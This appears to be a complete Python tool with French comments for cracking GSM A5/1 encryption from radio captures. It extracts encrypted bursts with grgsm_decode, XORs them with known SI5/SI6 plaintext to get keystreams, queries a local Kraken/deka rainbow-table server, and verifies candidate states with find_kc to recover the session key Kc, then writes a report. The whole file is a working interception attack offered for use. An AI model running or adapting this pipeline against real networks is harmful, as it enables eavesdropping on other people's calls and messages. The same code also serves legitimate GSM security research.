#!/usr/bin/env python3
# crack_all.py — attaque A5/1 depuis un .cfile, deka-friendly + LOGS detailles.
#
#   .cfile --(grgsm_decode -p, sans cle)--> bursts chiffres
#          --XOR plaintext connu--> keystreams --deka--> etats --find_kc--> Kc
#
# Lots drainés (aucun job orphelin), Ctrl-C propre. Logs: stdout + crack_all.log.
#
# Usage: python3 crack_all.py <cfile|bursts> [--mode TCHF --ts 2 --arfcn 1 --samp 1083333]
#        [--start FN --step 104 --maxblocks 24 --plain si5_sacch,si6_sacch --batch 8]
#        [--secs 320 --log crack_all.log --verbose]

import sys, os, socket, select, time, subprocess, tempfile, signal
from datetime import datetime
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
_HERE=os.path.dirname(os.path.abspath(__file__))
from ciphereds import load, block
from plaintexts import plaintext_bursts

FINDKC='/mnt/kraken/Utilities/find_kc'
HOST,PORT=('127.0.0.1',6666)
def xor(a,b): return ''.join('1' if a[i]!=b[i] else '0' for i in range(114))
def opt(n,d): return sys.argv[sys.argv.index(n)+1] if n in sys.argv else d
def has(*flags): return any(x in sys.argv for x in flags)
def opt2(long_,short,d):
    for fl in (long_,short):
        if fl in sys.argv: return sys.argv[sys.argv.index(fl)+1]
    return d
VERBOSE='--verbose' in sys.argv

_LOGF=None
_REPORT=None

class RunReport:
    def __init__(self):
        self.events=[]
        self.start_time=None
        self.end_time=None
        self.kc_found=False
        self.kc_state=None
        self.kc_bitpos=None
        self.kc_count=None
        self.kc_verify_count=None
        self.kc_hex=None
        self.detected_rate=None
        self.detected_mode=None
        self.detected_ts=None
        self.plaintexts=[]
        self.si_derivations=[]
        self.blocks_cracked=0
        self.keystreams=0
        self.total_found=0
        self.source=None
        self.arfcn=None
        self.mode_final=None
        self.ts_final=None
        self.samp_final=None
        # Détails du succès
        self.success_keystream=None
        self.success_ciphered_bursts=None
        self.success_plaintext_bursts=None
        self.success_plaintext_type=None
        self.success_findkc_cmd=None
        self.success_findkc_output=None

def log(msg):
    global _REPORT
    line="[%s] %s"%(datetime.now().strftime('%H:%M:%S'), msg)
    print(line, flush=True)
    if _LOGF:
        _LOGF.write(line+"\n"); _LOGF.flush()
    if _REPORT:
        _REPORT.events.append((datetime.now().strftime('%H:%M:%S'), msg))

STOP=False
def _sig(*_):
    global STOP; STOP=True
    log("Ctrl-C: on draine le lot en cours puis on sort (pas d'orphelins)...")
signal.signal(signal.SIGINT,_sig)

# ordre de priorité (les plus courants d'abord) — pas trie
CAND_RATES = [1083333, 574712, 1000000, 1625000, 812500, 2166666, 541666]
for _d in (100,112,128,174,175,64,96,192,256):
    r=round(100000000/_d)
    if r not in CAND_RATES: CAND_RATES.append(r)

def _count_bursts(cfile, mode, ts, arfcn, samp, secs):
    sp=tempfile.mktemp(suffix='.gsm',dir=_HERE)
    cmd=['grgsm_decode','-m',mode,'-t',str(ts),'-a',str(arfcn),'-s',str(samp),'-c',cfile,'-p','-o',sp]
    n=0
    try:
        r=subprocess.run(cmd,stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,timeout=int(secs))
        n=sum(1 for _ in r.stdout.splitlines())
    except subprocess.TimeoutExpired: pass
    try: os.remove(sp)
    except OSError: pass
    return n

SI_CHANNELS = [('SDCCH8','1'),('SDCCH8','0'),('SDCCH8','2'),('SDCCH8','3'),
               ('SDCCH8','4'),('SDCCH8','5'),('SDCCH8','6'),('SDCCH8','7'),
               ('BCCH_SDCCH4','0')]

def find_si_channel(cfile, arfcn, samp, sitype, secs=40):
    """Cherche le (mode,ts) ou le SI (06 1d/1e) apparait en clair (decode SANS cle)."""
    global _REPORT
    log("  AUTO-CANAL: recherche du %s clair sur %d canaux..."%(sitype,len(SI_CHANNELS)))
    for m,t in SI_CHANNELS:
        sp=tempfile.mktemp(suffix='.gsm',dir=_HERE)
        cmd=['grgsm_decode','-m',m,'-t',str(t),'-a',str(arfcn),'-s',str(samp),
             '-c',cfile,'-v','-o',sp]
        found=False
        try:
            r=subprocess.run(cmd,stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,timeout=secs)
            for line in r.stdout.decode('ascii','ignore').splitlines():
                if ':' not in line: continue
                hexb=line.split(':',1)[1].split()
                if len(hexb)>=20 and SI_MARK[sitype] in ''.join(hexb)[:20]:
                    found=True; break
        except subprocess.TimeoutExpired: pass
        try: os.remove(sp)
        except OSError: pass
        log("    %s -t%s : %s"%(m,t,'SI TROUVE' if found else '-'))
        if found:
            log("  AUTO-CANAL: %s -> %s -t%s"%(sitype,m,t))
            if _REPORT: _REPORT.detected_mode,_REPORT.detected_ts = m,t
            return (m,t)
    return None

def find_clear_si(cfile, mode, ts, arfcn, samp, sitype, secs=120):
    """Decode SANS cle -> FN de la 1ere trame SI claire (avant chiffrement)."""
    sp=tempfile.mktemp(suffix='.gsm',dir=_HERE)
    cmd=['grgsm_decode','-m',mode,'-t',str(ts),'-a',str(arfcn),'-s',str(samp),
         '-c',cfile,'-v','-o',sp]
    log("  cherche %s clair (decode SANS cle) %s -t%s -s%s ..."%(sitype,mode,ts,samp))
    fn=None
    try:
        r=subprocess.run(cmd,stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,timeout=secs)
        for line in r.stdout.decode('ascii','ignore').splitlines():
            a=line.split()
            if len(a)<3 or ':' not in a[1]: continue
            hexb=line.split(':',1)[1].split()
            if len(hexb)<20: continue
            if SI_MARK[sitype] in ''.join(hexb)[:20]:
                fn=int(a[0]); log("  %s clair trouve au FN %d"%(sitype,fn)); break
    except subprocess.TimeoutExpired: pass
    try: os.remove(sp)
    except OSError: pass
    return fn

def decoded_plain_map(cfile, mode, ts, arfcn, samp, kc, secs=180):
    """Decode toute la capture (avec la cle) -> {FN_bloc: 4 bursts plaintext ENCODES}.
    Utilise le clair EXACT de chaque trame (en-tete L1 inclus) -> pas d'erreur d'en-tete."""
    from gsmcode import encode_hex
    sp=tempfile.mktemp(suffix='.gsm',dir=_HERE)
    cmd=['grgsm_decode','-m',mode,'-t',str(ts),'-a',str(arfcn),'-s',str(samp),
         '-c',cfile,'-v','-e','1','-k',kc,'-o',sp]
    log("  decode complet (clair par trame) %s -t%s -s%s ..."%(mode,ts,samp))
    m={}
    try:
        r=subprocess.run(cmd,stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,timeout=secs)
        for line in r.stdout.decode('ascii','ignore').splitlines():
            a=line.split()
            if len(a)<3 or ':' not in a[1]: continue
            try: fn=int(a[0])
            except: continue
            hexb=line.split(':',1)[1].split()
            if len(hexb)!=23: continue
            m[fn]=encode_hex(''.join(hexb))
    except subprocess.TimeoutExpired: pass
    try: os.remove(sp)
    except OSError: pass
    log("  clair par trame: %d trames decodees"%len(m))
    return m

SI_MARK = {'si5':'061d','si6':'061e','si5clear':'061d','si6clear':'061e'}   # type RR: SI5=1d, SI6=1e

def derive_si_bursts(cfile, mode, ts, arfcn, samp, sitype, secs=120):
    """SI clair (decode SANS cle) -> met le TA (octet 1 de l'en-tete L1 SACCH) a 0
    (comme la doc: 00 01.. -> 00 00..) -> encode en 4 bursts plaintext.
    Aucune cle requise : le SI est diffuse en clair."""
    global _REPORT
    from gsmcode import encode_hex
    sp=tempfile.mktemp(suffix='.gsm',dir=_HERE)
    cmd=['grgsm_decode','-m',mode,'-t',str(ts),'-a',str(arfcn),'-s',str(samp),
         '-c',cfile,'-v','-o',sp]                      # SANS -e/-k : le SI est clair
    log("  derive %s (SANS cle): decode %s -t%s -s%s ..."%(sitype,mode,ts,samp))
    hexframe=None; sifn=None; hexframe_orig=None
    try:
        r=subprocess.run(cmd,stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,timeout=secs)
        for line in r.stdout.decode('ascii','ignore').splitlines():
            a=line.split()
            if len(a)<3 or ':' not in a[1]: continue
            hexb=line.split(':',1)[1].split()
            if len(hexb)<20: continue
            if SI_MARK[sitype] in ''.join(hexb)[:20]:
                hexframe=(''.join(hexb))[:46]; hexframe_orig=hexframe; sifn=int(a[0])
                break
    except subprocess.TimeoutExpired: pass
    try: os.remove(sp)
    except OSError: pass
    if not hexframe:
        log("  derive %s: introuvable en clair (change -m/-t, ou pas de trame claire)"%sitype); return (None,None)
    hexframe = hexframe[:2] + '00' + hexframe[4:]       # TA (octet 1) -> 0
    log("  derive %s (TA=0) FN %d: trame = %s"%(sitype,sifn,hexframe))
    if _REPORT:
        _REPORT.si_derivations.append({'type':sitype,'fn':sifn,'hex_before':hexframe_orig,'hex_after':hexframe})
    return (encode_hex(hexframe), sifn)

def auto_detect(cfile, mode, ts, arfcn, secs=12):
    global _REPORT
    # sonde sur le beacon BCCH_SDCCH4/t0 : il decode des que le rate est bon
    log("AUTO-DETECTION du sample-rate sur BCCH_SDCCH4/t0 -a %s (jusqu'a %d candidats, ~%ds chacun)..."%(arfcn,len(CAND_RATES),secs))
    best=(0,None)
    for r in CAND_RATES:
        n=_count_bursts(cfile, 'BCCH_SDCCH4', 0, arfcn, r, secs)
        log("  rate=%-9d -> %d bursts"%(r,n))
        if n>best[0]: best=(n,r)
        if n>=200:   # hit franc -> on s'arrete la
            log("  (hit franc, arret du sweep)"); break
    if best[1] is None or best[0]<30:
        log("AUTO: aucun rate concluant (essaie -m/-t different, ou capture invalide)")
        return None
    log("AUTO: meilleur = %d Hz (%d bursts)"%(best[1],best[0]))
    if _REPORT: _REPORT.detected_rate=best[1]
    return best[1]

def extract_bursts(cfile,mode,ts,arfcn,samp,secs):
    out=tempfile.mktemp(suffix='.bursts',dir=_HERE); sp=tempfile.mktemp(suffix='.gsm',dir=_HERE)
    cmd=['grgsm_decode','-m',mode,'-t',str(ts),'-a',str(arfcn),'-s',str(samp),'-c',cfile,'-p','-o',sp]
    log("extraction: "+' '.join(cmd))
    t0=time.time()
    with open(out,'w') as f:
        try: subprocess.run(cmd,stdout=f,stderr=subprocess.DEVNULL,timeout=int(secs))
        except subprocess.TimeoutExpired: pass
    try: os.remove(sp)
    except OSError: pass
    log("extraction finie en %.0fs -> %s"%(time.time()-t0, os.path.basename(out)))
    return out

def drain_batch(sock, lot, lidx):
    """lot = liste de (keystream, count). Soumet, attend TOUS les 'took', retourne Found."""
    myset={ks for ks,cnt in lot}; jobmap={}; founds=[]; buf=b''; ntook=0
    for ks,cnt in lot:
        sock.sendall(("crack %s\n"%ks).encode()); time.sleep(0.02)
        if VERBOSE: log("  soumis count=%s ks=%s..."%(cnt, ks[:24]))
    log("lot %d : %d keystreams soumis, attente des resultats..."%(lidx,len(lot)))
    sock.setblocking(False); t0=time.time()
    while ntook < len(lot):
        if STOP: break
        r,_,_=select.select([sock],[],[],3.0)
        if not r:
            if time.time()-t0>600: log("lot %d : timeout (>600s)"%lidx); break
            continue
        d=sock.recv(32768)
        if not d: raise ConnectionError("deka a ferme la connexion")
        buf+=d
        while b'\n' in buf:
            line,buf=buf.split(b'\n',1); t=line.decode('ascii','ignore').rstrip(); p=t.split()
            if t.startswith('Cracking') and len(p)>=3 and p[2] in myset:
                jobmap[p[1].lstrip('#')]=p[2]
            elif t.startswith('Found') and len(p)>=5:
                ks=jobmap.get(p[4].lstrip('#'))
                if ks: founds.append((p[1],p[3],ks))
            elif 'took' in t and len(p)>=2 and p[1].lstrip('#') in jobmap:
                ntook+=1
                if VERBOSE: log("  %s"%t)
    sock.setblocking(True)
    log("lot %d : %d/%d traites, %d Found"%(lidx,ntook,len(lot),len(founds)))
    return founds

def write_report(report, src):
    """Génère un rapport markdown résumant la méthode et les résultats du crack."""
    if not report or not report.start_time:
        return

    import re

    # Déterminer le chemin de sortie : même dossier que src, avec extension _report.md
    src_abs=os.path.abspath(src)
    src_dir=os.path.dirname(src_abs) or '.'
    src_base=os.path.splitext(os.path.basename(src_abs))[0]
    report_path=os.path.join(src_dir, src_base+'_report.md')

    duration_s=(report.end_time-report.start_time).total_seconds() if report.end_time else 0

    # Construire le markdown
    md=[]
    md.append("# Compte-rendu A5/1 crack — `crack_all.py`")
    md.append("")

    # Section 1 : Méthode (résumé)
    md.append("## Méthode")
    md.append("")
    md.append("**Principe :** A5/1 est un chiffrement par flot. En exploitant du plaintext connu")
    md.append("(SI5/SI6 diffusés en clair sur le BCCH, ou bourrage LAPDm), on récupère le keystream")
    md.append("via `chiffré XOR plaintext`. Kraken/deka retrouvent alors l'état interne A5/1")
    md.append("(le Kc) à partir d'un segment de keystream >=64 bits sans erreur. `find_kc` valide")
    md.append("le Kc en testant sur une 2e trame.")
    md.append("")
    md.append("**Étapes :**")
    md.append("")
    md.append("1. Auto-détection du sample-rate (sonde BCCH_SDCCH4/t0)")
    md.append("2. Extraction des bursts chiffrés (sans clé)")
    md.append("3. Dérivation du plaintext (SI en clair, TA=0)")
    md.append("4. Groupement en blocs de 4 trames (XOR -> keystreams)")
    md.append("5. Soumission à deka/Kraken")
    md.append("6. Vérification des états candidats avec `find_kc`")
    md.append("")
    md.append("_Voir `METHODE.md` pour les détails complets._")
    md.append("")

    # Section 2 : Résultats
    md.append("## Résultats")
    md.append("")
    md.append("| Paramètre | Valeur |")
    md.append("|---|---|")
    md.append("| **Source** | `%s` |"%os.path.basename(report.source or src))
    md.append("| **Date/Heure** | %s |"%(report.start_time.strftime("%Y-%m-%d %H:%M:%S")))
    md.append("| **Durée** | %.1f s |"%duration_s)
    md.append("| **ARFCN** | %s |"%(report.arfcn or "—"))
    md.append("| **Sample-rate détecté** | %d Hz |"%(report.detected_rate or 0))
    md.append("| **Mode/TS détectés** | %s / %s |"%(report.detected_mode or "—", report.detected_ts or "—"))
    md.append("| **Mode/TS effectif** | %s / %s |"%(report.mode_final or "—", report.ts_final or "—"))

    if report.si_derivations:
        md.append("| **SI dérivé** | %s |"%", ".join(d["type"]+" FN "+str(d["fn"]) for d in report.si_derivations))
        for deriv in report.si_derivations:
            md.append("|  |  |")
            md.append("|  ├─ %s (avant TA=0) | `%s` |"%(deriv["type"], deriv["hex_before"]))
            md.append("|  └─ %s (TA=0) | `%s` |"%(deriv["type"], deriv["hex_after"]))

    md.append("| **Plaintext(s)** | %s |"%", ".join(report.plaintexts) if report.plaintexts else "—")
    md.append("| **Blocs crackés** | %d |"%report.blocks_cracked)
    md.append("| **Keystreams** | %d |"%report.keystreams)
    md.append("| **Candidats trouvés (deka)** | %d |"%report.total_found)

    md.append("| | |")
    if report.kc_found and report.kc_hex:
        md.append("| **✅ Kc TROUVÉ** | |")
        md.append("| État crackeur | `%s` |"%(report.kc_state or "—"))
        md.append("| Bitpos | %s |"%(report.kc_bitpos or "—"))
        md.append("| Count (trame) | %s |"%(report.kc_count or "—"))
        md.append("| Count (vérif) | %s |"%(report.kc_verify_count or "—"))
        md.append("| **Kc (hex)** | `%s` |"%report.kc_hex)
    else:
        md.append("| **Kc non trouvé** | |")
        md.append("| Raison | %d blocs essayés, aucun match find_kc |"%report.blocks_cracked)
        md.append("| **Conseil** | Augmenter `--maxblocks` ou essayer un autre plaintext |")

    md.append("| **Log détaillé** | `crack_all.log` |")
    md.append("")

    # Section 3 : Détails du succès (si Kc trouvé)
    if report.kc_found:
        md.append("## Détails du succès")
        md.append("")

        if report.success_keystream:
            md.append("**Keystream (XOR chiffré ⊕ plaintext) :**")
            md.append("")
            md.append("```")
            md.append(report.success_keystream)
            md.append("```")
            md.append("")

        if report.success_findkc_cmd:
            md.append("**Commande find_kc :**")
            md.append("")
            md.append("```bash")
            md.append(report.success_findkc_cmd)
            md.append("```")
            md.append("")

        if report.success_findkc_output:
            md.append("**Sortie find_kc :**")
            md.append("")
            md.append("```")
            for ln in report.success_findkc_output.splitlines():
                if ln.strip():
                    md.append(ln)
            md.append("```")
            md.append("")

    # Écrire le fichier
    try:
        with open(report_path, 'w') as f:
            f.write('\n'.join(md))
        log("compte-rendu: %s"%report_path)
    except Exception as e:
        log("ERREUR écriture rapport: %s"%e)

def main():
    global _LOGF, _REPORT
    if len(sys.argv)<2: sys.exit(__doc__)
    src=sys.argv[1]
    logpath=opt('--log', os.path.join(_HERE,'crack_all.log'))
    _LOGF=open(logpath,'a'); _REPORT=RunReport()
    log("==== NOUVEAU RUN : %s ===="%src)
    _REPORT.source=src
    _REPORT.start_time=datetime.now()
    names=opt('--plain','si5_sacch,si6_sacch').split(',')
    batch=int(opt('--batch','8'))
    mode=opt2('--mode','-m','TCHF'); ts=opt2('--ts','-t','2'); arfcn=opt2('--arfcn','-a','1'); samp=opt2('--samp','-s','1083333')
    force_si = any(n in ('si5','si6') for n in names) and not has('--mode','-m') and not has('--ts','-t')
    if force_si:
        mode, ts = 'SDCCH8', '1'
        log("--plain si5/si6 -> canal AUTO SDCCH8/t1 (la ou vit le SI5)")
    fmode,fts,farfcn,fsamp = mode,ts,arfcn,samp
    if src.endswith('.cfile'):
        user_set_mode = has('--mode','-m') or has('--ts','-t') or force_si
        def _do_auto():
            nonlocal fmode,fts,farfcn,fsamp
            r=auto_detect(src, mode, ts, arfcn)
            if not r: return None
            if force_si and not (has('--mode','-m') or has('--ts','-t')):
                sitype=next(n for n in names if n in ('si5','si6'))
                ch=find_si_channel(src, arfcn, r, sitype)
                m,t = ch if ch else (mode,ts)
            else:
                m,t = (mode,ts) if user_set_mode else ('BCCH_SDCCH4','0')
            log("AUTO: extraction avec -s %d -m %s -t %s"%(r,m,t))
            bp=extract_bursts(src,m,t,arfcn,str(r),opt('--secs','320'))
            fmode,fts,farfcn,fsamp = m,t,arfcn,str(r)
            return bp
        if '--auto' in sys.argv or force_si:
            bp=_do_auto(); bpath=bp if bp else extract_bursts(src,mode,ts,arfcn,samp,opt('--secs','320'))
        else:
            bpath=extract_bursts(src,mode,ts,arfcn,samp,opt('--secs','320'))
        bursts=load(bpath); fns=sorted(bursts)
        if not fns:   # 0 burst -> auto-detection de secours
            log("0 burst avec -s %s -m %s -t %s -> auto-detection..."%(samp,mode,ts))
            bp=_do_auto()
            if bp: bpath=bp; bursts=load(bpath); fns=sorted(bursts)
    else:
        bpath=src; bursts=load(bpath); fns=sorted(bursts)
    if not fns: sys.exit("aucun burst (mauvais -m/-t/-a/-s ; essaie --auto)")
    log("bursts: %d  FN %d -> %d"%(len(bursts),fns[0],fns[-1]))
    _REPORT.plaintexts=names
    _REPORT.arfcn=arfcn
    _REPORT.mode_final=fmode
    _REPORT.ts_final=fts
    _REPORT.samp_final=fsamp
    step=int(opt('--step','104')); start=int(opt('--start',str(fns[0]))); maxb=int(opt('--maxblocks','24'))
    kc=opt('--kc',None)
    CLEAR_REF=None; clear_fn=None
    for n in names:
        if n in ('si5clear','si6clear'):
            clear_fn=find_clear_si(src, fmode, fts, farfcn, fsamp, n)
            if clear_fn is None: sys.exit("aucun %s clair trouve (change -m/-t, ou pas de trame claire)"%n)
            ref=block(bursts, clear_fn)
            if not ref: sys.exit("bloc clair FN %d incomplet"%clear_fn)
            CLEAR_REF=[b for _,b in ref]   # 4 bursts clairs = le plaintext
            log("  reference claire = bursts du bloc FN %d"%clear_fn)
    DEC_MAP=None
    if 'decoded' in names:
        if not kc: sys.exit("--plain decoded exige --kc <cle>")
        DEC_MAP=decoded_plain_map(src, fmode, fts, farfcn, fsamp, kc)
    Pc={}
    for n in names:
        if n in ('decoded','si5clear','si6clear'): continue
        if n in ('si5','si6'):
            b,sifn=derive_si_bursts(src, fmode, fts, farfcn, fsamp, n)   # SANS cle, TA=0
            if not b: sys.exit("impossible de deriver %s en clair"%n)
            Pc[n]=b
            if not has('--start') and sifn is not None:
                start=sifn; log("  AUTO start=%d (FN du SI clair)"%start)
            if not has('--step'):
                step=102 if str(fmode).startswith('SDCCH8') else 104
                log("  AUTO step=%d (periode SACCH %s)"%(step,fmode))
        else:
            Pc[n]=plaintext_bursts(n)
    ks_by_count={}; nb=0; fn=start
    while fn<=fns[-1] and nb<maxb:
        blk=block(bursts,fn)
        if blk:
            nb+=1
            for n in names:
                for i in range(4):
                    c,cb=blk[i]; ks_by_count.setdefault(xor(cb,Pc[n][i]),c)
        fn+=step
    jobs=[(k,c) for k,c in ks_by_count.items()]
    _REPORT.blocks_cracked=nb
    _REPORT.keystreams=len(jobs)
    log("plaintexts=%s  blocs=%d  keystreams=%d  lots de %d"%(','.join(names),nb,len(jobs),batch))
    allks=[(c,k) for k,c in jobs]

    total_found=0; t_start=time.time()
    def try_findkc(state,bitpos,cnt,ks=None):
        global _REPORT
        import re
        dec=str(int(state,16))+'x'; tries=0
        for c2,k2 in allks:
            if c2==cnt: continue
            tries+=1
            cmd=[FINDKC,dec,str(bitpos),str(cnt),str(c2),k2]
            out=subprocess.run(cmd,capture_output=True,text=True).stdout
            if 'MATCHED' in out:
                for ln in out.splitlines():
                    if 'MATCHED' in ln:
                        log("*** KC TROUVE *** (etat=%s bitpos=%s count=%s verif-count=%s)"%(state,bitpos,cnt,c2))
                        log("   "+ln.strip())
                        # Parser la ligne KC(N): xx yy zz ... pour extraire le Kc hex
                        m=re.search(r'KC\(\d+\):\s*((?:[0-9a-f]{2}\s+)*[0-9a-f]{2})',ln,re.IGNORECASE)
                        if m and _REPORT:
                            kc_hex=' '.join(m.group(1).split()).upper()
                            _REPORT.kc_found=True
                            _REPORT.kc_state=state
                            _REPORT.kc_bitpos=bitpos
                            _REPORT.kc_count=cnt
                            _REPORT.kc_verify_count=c2
                            _REPORT.kc_hex=kc_hex
                            # Capturer la commande et la sortie complète
                            _REPORT.success_findkc_cmd=' '.join(cmd)
                            _REPORT.success_findkc_output=out
                            # Capturer le keystream
                            if ks: _REPORT.success_keystream=ks
                return True
        if VERBOSE: log("  find_kc: %d trames essayees, aucun match pour etat %s"%(tries,state))
        return False

    sock=socket.socket(); sock.connect((HOST,PORT)); log("connecte a deka %s:%d"%(HOST,PORT))
    try:
        for i in range(0,len(jobs),batch):
            if STOP: log("arret demande."); break
            lot=jobs[i:i+batch]   # liste (keystream,count) — pas de dico (sinon si5/si6 meme count s'ecrasent)
            founds=drain_batch(sock,lot,i//batch)
            total_found+=len(founds)
            _REPORT.total_found=total_found
            for state,bitpos,ks in founds:
                cnt=ks_by_count[ks]
                log("Found etat=%s @ %s count=%s -> verification find_kc..."%(state,bitpos,cnt))
                if try_findkc(state,bitpos,cnt,ks):
                    # Capturer les détails du bloc qui a marché
                    if _REPORT.kc_found:
                        _REPORT.success_keystream=ks
                        # Récupérer le bloc chiffré
                        blk_fn=None
                        for fn in sorted(bursts):
                            if fn<=cnt<fn+4*33:  # bloc de 4 trames = 4*33 counts
                                blk_fn=fn; break
                        if blk_fn:
                            blk=block(bursts,blk_fn)
                            if blk: _REPORT.success_ciphered_bursts=[cb for _,cb in blk]
                    _REPORT.end_time=datetime.now()
                    log("TERMINE en %.0fs, %d Found au total."%(time.time()-t_start,total_found))
                    write_report(_REPORT, src)
                    return
        _REPORT.end_time=datetime.now()
        log("FINI sans MATCHED : %d Found en %.0fs. (essaie plus de blocs / autre plaintext)"%(total_found,time.time()-t_start))
        write_report(_REPORT, src)
    finally:
        sock.close(); log("connexion fermee proprement (aucun job orphelin). Log: %s"%logpath)

if __name__=='__main__': main()
